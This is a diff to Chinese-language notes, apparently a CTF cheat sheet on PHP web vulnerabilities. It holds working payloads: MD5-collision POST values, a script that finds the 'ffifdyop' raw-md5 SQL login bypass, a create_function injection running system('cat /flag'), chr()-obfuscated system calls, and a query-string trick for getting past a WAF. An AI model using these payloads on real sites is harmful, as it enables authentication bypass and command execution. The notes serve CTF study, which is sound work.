@@ -38,7 +38,6 @@ ReflectionClass
 class fuc{ static function methond(){ echo 'Hello World!'; } } 
 
 echo new ReflectionClass('fuc');
-
 ```
 
 ```
@@ -89,7 +88,7 @@ PHP在处理哈希字符串时，会利用”!=”或”\==”来对哈希值进
 
 ③如果是强碰撞：
 if((string)$_POST['a']!==(string)$_POST['b'] && md5($_POST['a'])===md5($_POST['b'])){
-	die("success!");
+    die("success!");
 }
 
 username=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
@@ -100,6 +99,15 @@ array2=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%
 
 还有另一种玩法：md5($password,true)
 参数是True，意为返回原始16字符二进制格式
+
+<?php
+$a=1;
+while(!stripos(md5($a, true), '\'or\'')){
+	$a=$a+1;
+}
+echo $a."\n";;
+echo md5($a, true);
+?>
 
 常用的：ffifdyop，该字符串md5加密后若raw参数为True时会返回 'or'6<trash> (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<trash>会在MySQL将其转换成整型比较时丢掉)
 ```
@@ -128,6 +136,7 @@ array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%2
 数组绕过
 
 科学计数法绕过（0e开头）
+
 例如：常配合用语句  <?=`cat *`;  进行base64编码然后再转十六进制，去掉最后的=，刚好可以是科学计数法
 ```
 
@@ -193,8 +202,6 @@ addslashes()
 将' " \ 转义
 ```
 
-
-
 **assert(mixed $assertion, Throwable $exception = ?): bool**
 
 ```
@@ -255,8 +262,6 @@ select * from admin where password=''or'6<乱码>'
 129581926211651571912466741651878684928 也可达同样的效果
 ```
 
-
-
 ## 特征
 
 ```
@@ -266,8 +271,6 @@ select * from admin where password=''or'6<乱码>'
 ```
 
 ## 可变函数
-
-
 
 - php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数
 - 例如：`$function = "sayHello";$function();`
@@ -285,7 +288,7 @@ $addFunction = create_function('$a, $b', 'return $a + $b;');
 
 实际上函数是
 function ($a, $b){
-	return $a + $b;
+    return $a + $b;
 }
 
 此时我们可以通过闭合掉第一个大括号{，并注释掉之后的最后的}，来实现命令执行，此时payload为b=}system(%27cat%20/flag%27);/*
@@ -313,4 +316,46 @@ ${system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(
 
 ## 数组溢出
 
-> PHP索引数组最大下标等于最大int数，对其追加会导致整型数溢出，进而引起追加失败
+PHP索引数组最大下标等于最大int数，对其追加会导致整型数溢出，进而引起追加失败
+
+```
+int范围查阅Manual可知：32位最大是231-1，64位是263-1
+也就是2147483647与9223372036854775807
+```
+
+
+
+## 配置文件路径
+
+```
+session存放路径 
+/var/lib/php/sessions
+```
+
+## PHP的字符串解析特性
+
+```
+我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
+/news.php?%20news[id%00=42"+AND+1=0–
+
+上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。
+
+HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
+
+1.删除空白符
+
+2.将某些字符转换为下划线（包括空格）
+
+在了解到PHP的字符串解析之后，我们思考一个问题，WAF它不让num参数传入字母，所以我们不能让WAF文件检测到字母，但是我们又需要传入字母来构成我们的命令，这种情况下我们该怎么对其进行绕过呢？
+
+因为num不可以传入字母，但是我们在num参数之前添加一个空格，这样在PHP的语言特性下会默认删除这个空格，但是WAF会因为这个空格导致检测不到num这个参数，最终导致WAF被绕过。
+
+Payload
+
+
+http://node4.buuoj.cn:25591/calc.php?num=a #被拦截
+
+
+http://node4.buuoj.cn:25591/calc.php? num=a #绕过WAF
+```
+
